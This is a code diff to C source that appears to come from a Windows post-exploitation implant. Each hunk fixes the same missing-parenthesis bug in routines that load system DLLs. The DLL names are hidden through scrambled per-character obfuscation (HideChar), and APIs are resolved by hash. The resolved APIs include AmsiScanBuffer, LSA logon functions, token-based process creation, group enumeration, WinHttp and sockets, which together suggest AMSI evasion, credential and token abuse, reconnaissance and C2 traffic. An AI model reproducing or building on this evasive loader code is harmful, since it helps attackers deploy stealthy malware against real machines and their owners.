@@ -22,7 +22,7 @@ BOOL RtAdvapi32(
     ModuleName[ 5  ] = HideChar('I');
     ModuleName[ 4  ] = HideChar('P');
 
-    if ( ( Instance->Modules.Advapi32 = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Advapi32 = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.GetTokenInformation          = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
         Instance->Win32.CreateProcessWithTokenW      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
@@ -86,7 +86,7 @@ BOOL RtMscoree(
     ModuleName[ 6  ] = HideChar('E');
     ModuleName[ 3  ] = HideChar('O');
 
-    if ( ( Instance->Modules.Mscoree = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Mscoree = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.CLRCreateInstance = LoaderFuncAdd( Instance->Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );
 
@@ -119,7 +119,7 @@ BOOL RtOleaut32(
     ModuleName[ 9  ] = HideChar('D');
     ModuleName[ 8  ] = HideChar('.');
 
-    if ( ( Instance->Modules.Oleaut32 = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Oleaut32 = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.SafeArrayAccessData   = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
         Instance->Win32.SafeArrayUnaccessData = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
@@ -156,7 +156,7 @@ BOOL RtUser32(
     ModuleName[ 2  ] = HideChar('E');
     ModuleName[ 4  ] = HideChar('3');
 
-    if ( ( Instance->Modules.User32 = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.User32 = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.ShowWindow       = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_SHOWWINDOW );
         Instance->Win32.GetSystemMetrics = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_GETSYSTEMMETRICS );
@@ -191,7 +191,7 @@ BOOL RtShell32(
     ModuleName[ 3  ] = HideChar('L');
     ModuleName[ 2  ] = HideChar('E');
 
-    if ( ( Instance->Modules.Shell32 = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Shell32 = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.CommandLineToArgvW = LoaderFuncAdd( Instance->Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );
 
@@ -222,7 +222,7 @@ BOOL RtMsvcrt(
     ModuleName[ 5  ] = HideChar('T');
     ModuleName[ 1  ] = HideChar('S');
 
-    if ( ( Instance->Modules.Msvcrt = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Msvcrt = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.vsnprintf  = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_VSNPRINTF );
         Instance->Win32.swprintf_s = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_SWPRINTF_S );
@@ -256,7 +256,7 @@ BOOL RtIphlpapi(
     ModuleName[ 4  ] = HideChar('P');
     ModuleName[ 7  ] = HideChar('I');
 
-    if ( ( Instance->Modules.Iphlpapi = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Iphlpapi = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.GetAdaptersInfo = LoaderFuncAdd( Instance->Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );
 
@@ -286,7 +286,7 @@ BOOL RtGdi32(
     ModuleName[ 0 ] = HideChar('G');
     ModuleName[ 3 ] = HideChar('3');
 
-    if ( ( Instance->Modules.Gdi32 = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Gdi32 = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.GetCurrentObject   = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
         Instance->Win32.GetObjectW         = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETOBJECTW );
@@ -326,7 +326,7 @@ BOOL RtNetApi32(
     ModuleName[ 1  ] = HideChar('E');
     ModuleName[ 7  ] = HideChar('2');
 
-    if ( ( Instance->Modules.NetApi32 = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.NetApi32 = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.NetLocalGroupEnum = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
         Instance->Win32.NetGroupEnum      = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETGROUPENUM );
@@ -363,7 +363,7 @@ BOOL RtWs2_32(
     ModuleName[ 8  ] = HideChar('L');
     ModuleName[ 7  ] = HideChar('D');
 
-    if ( ( Instance->Modules.Ws2_32 = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Ws2_32 = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.WSAStartup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSASTARTUP );
         Instance->Win32.WSACleanup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSACLEANUP );
@@ -409,7 +409,7 @@ BOOL RtSspicli(
     ModuleName[ 4  ] = HideChar('C');
     ModuleName[ 3  ] = HideChar('I');
 
-    if ( ( Instance->Modules.Sspicli = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Sspicli = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.LsaRegisterLogonProcess        = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
         Instance->Win32.LsaLookupAuthenticationPackage = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
@@ -445,7 +445,7 @@ BOOL RtAmsi(
     ModuleName[ 1 ] = HideChar('M');
     ModuleName[ 2 ] = HideChar('S');
 
-    if ( ( Instance->Modules.Amsi = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.Amsi = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.AmsiScanBuffer = LoaderFuncAdd( Instance->Modules.Amsi, H_FUNC_AMSISCANBUFFER );
 
@@ -478,7 +478,7 @@ BOOL RtWinHttp(
     ModuleName[ 3  ] = HideChar('H');
     ModuleName[ 5  ] = HideChar('T');
 
-    if ( ( Instance->Modules.WinHttp = LoaderModLod ModuleName ) ) ) {
+    if ( ( Instance->Modules.WinHttp = LoaderModLod( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.WinHttpOpen                           = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPOPEN );
         Instance->Win32.WinHttpConnect                        = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
